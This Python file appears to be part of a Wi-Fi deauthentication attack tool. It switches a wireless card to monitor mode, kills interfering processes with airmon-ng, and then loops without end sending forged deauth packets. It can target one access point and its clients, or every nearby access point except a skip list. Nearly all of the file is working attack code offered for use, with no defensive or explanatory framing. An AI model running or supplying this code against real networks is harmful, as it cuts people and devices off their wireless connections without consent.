import subprocess
from wifi_utils import *
import sys


def prepare_attack():
	monitor_mode()
	kill_processes()

	

def send_AP_deauth(AP):
	try:
		pkt = AP.build_AP_deauth_pkt()
		print("Sending generic deauth packet from AP %s" % (AP.BSSID))
		sendp(pkt, iface=network.interface_name, verbose=False)
	except:
		print("deauth packet skipped")

def send_client_deauth(AP):
	try:
		for client in AP.clients:
			pkt = AP.build_client_deauth_pkt(client)
			print("Sending targeted deauth packet to client %s" % (client))
			sendp(pkt, iface=network.interface_name, verbose=False)
	except:
		print("deauth packet skipped")


def deauth_AP(BSSID):
	AP = network.get_AP(BSSID)
	set_channel(AP)
	while 1:
		send_AP_deauth(AP)
		send_client_deauth(AP)


def deauth_all(skip):
	while 1:
		for AP in network.APs:
			if AP.BSSID in skip:
				continue
			set_channel(AP)
			send_AP_deauth(AP)
			send_client_deauth(AP)

def kill_processes():
    try:
        print("Killing processes that might interfer ...")
        subprocess.run(["airmon-ng", "check", "kill"],
                       check=True, capture_output=True)
    except subprocess.CalledProcessError:
        raise subprocess.CalledProcessError("Error killing processes.")